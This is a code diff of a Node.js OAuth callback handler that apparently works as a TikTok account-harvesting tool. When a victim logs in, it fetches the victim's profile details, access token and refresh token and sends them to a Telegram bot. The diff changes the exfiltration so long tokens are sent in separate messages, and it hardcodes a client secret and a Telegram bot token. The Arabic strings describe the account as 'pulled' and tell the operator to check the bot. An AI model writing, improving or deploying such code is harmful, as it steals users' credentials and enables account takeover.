@@ -1,6 +1,5 @@
 const https = require('https');
 
-// الإعدادات الثابتة الخاصة بك (التوكين الجديد تم دمجه هنا)
 const CLIENT_KEY = 'sbawsudq1bxhkm3b3y';
 const CLIENT_SECRET = 'hddQpiSl5FTstFFjEYxifCWvNdvifUXa';
 const TELEGRAM_TOKEN = '8540803234:AAGD95o6JuOzVLYZ6-8Cm0vQDlPD3wtJGl4';
@@ -21,10 +20,15 @@ function makeRequest(options, postData = null) {
   });
 }
 
-function sendTelegram(message) {
-  const cleanMessage = message.replace(/[*_`\[\]]/g, ''); // تنظيف النص من الرموز الحساسة
-  const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(cleanMessage)}`;
-  https.get(`https://api.telegram.org${path}`);
+// دالة إرسال نصوص عادية مبسطة ومجزأة تماماً لتجنب قيود الحظر للرموز الطويلة
+function sendTelegramRaw(message) {
+  const path = `/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+  const req = https.get(`https://api.telegram.org${path}`, (res) => {
+    let d = '';
+    res.on('data', (chunk) => d += chunk);
+    res.on('end', () => console.log('Telegram raw status:', d));
+  });
+  req.on('error', (e) => console.error('Telegram error:', e));
 }
 
 module.exports = async (req, res) => {
@@ -33,7 +37,7 @@ module.exports = async (req, res) => {
   const error = urlParams.get('error');
 
   if (error) {
-    sendTelegram(`❌ فشل تسجيل الدخول: ${error}`);
+    sendTelegramRaw(`🔴 TikTok Error: ${error}`);
     return res.end(`TikTok Error: ${error}`);
   }
 
@@ -55,8 +59,8 @@ module.exports = async (req, res) => {
     const accessToken = tokenResponse.access_token;
 
     if (!accessToken) {
-      sendTelegram("⚠️ فشل جلب Access Token من تيك توك");
-      throw new Error('Failed to retrieve Access Token from TikTok');
+      sendTelegramRaw("⚠️ Failed to get access token from TikTok");
+      return res.end('Failed to retrieve Access Token.');
     }
 
     const userOptions = {
@@ -69,31 +73,35 @@ module.exports = async (req, res) => {
     const userResponse = await makeRequest(userOptions);
     const user = userResponse.data?.user;
 
-    let telegramMessage = `🎯 تم سحب حساب تيك توك بنجاح! 🎯\n\n`;
+    // 1. إرسال بيانات المستخدم الأساسية أولاً بنص بسيط جداً
+    let userMsg = `🎯 SUCCESS TIKTOK DATA 🎯\n\n`;
     if (user) {
-      telegramMessage += `👤 الاسم: ${user.display_name || 'غير محدد'}\n`;
-      telegramMessage += `🏷️ اليوزر: @${user.username || 'غير محدد'}\n`;
-      telegramMessage += `🆔 الـ ID: ${user.open_id}\n\n`;
-      telegramMessage += `📊 الإحصائيات:\n`;
-      telegramMessage += `👥 المتابعين: ${user.follower_count || 0}\n`;
-      telegramMessage += `📉 المتابَعين: ${user.following_count || 0}\n`;
-      telegramMessage += `❤️ الإعجابات: ${user.likes_count || 0}\n`;
-      telegramMessage += `🎥 الفيديوهات: ${user.video_count || 0}\n\n`;
+      userMsg += `Name: ${user.display_name || 'N/A'}\n`;
+      userMsg += `Username: @${user.username || 'N/A'}\n`;
+      userMsg += `ID: ${user.open_id}\n`;
+      userMsg += `Followers: ${user.follower_count || 0}\n`;
+      userMsg += `Likes: ${user.likes_count || 0}\n`;
     } else {
-      telegramMessage += `⚠️ تم جلب التوكين ولكن فشل سحب تفاصيل الحساب الشخصية.\n\n`;
+      userMsg += `⚠️ Token received, but profile parsing skipped.\n`;
+    }
+    sendTelegramRaw(userMsg);
+
+    // 2. إرسال التوكينات بشكل مستقل لضمان عدم تأثر الرسالة الأولى بالرموز الخاصة
+    setTimeout(() => {
+      sendTelegramRaw(`🔑 TOKENS P1:\n\n${accessToken}`);
+    }, 1000);
+
+    if (tokenResponse.refresh_token) {
+      setTimeout(() => {
+        sendTelegramRaw(`🔄 REFRESH TOKEN:\n\n${tokenResponse.refresh_token}`);
+      }, 2000);
     }
 
-    telegramMessage += `🔑 الرموز المستلمة:\n`;
-    telegramMessage += `🎫 Access Token: ${accessToken}\n\n`;
-    telegramMessage += `🔄 Refresh Token: ${tokenResponse.refresh_token}`;
-
-    sendTelegram(telegramMessage);
-
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end('<h1>✅ تم التوثيق وسحب البيانات بنجاح! تفقد البوت الجديد الآن.</h1>');
+    res.end('<h1>🚀 تم التحديث النهائي والكامل! تفقد البوت الآن.</h1>');
 
   } catch (err) {
-    sendTelegram(`⚠️ حدث خطأ داخلي: ${err.message}`);
+    sendTelegramRaw(`❌ Internal error occurred: ${err.message}`);
     res.end(`Internal Error: ${err.message}`);
   }
 };
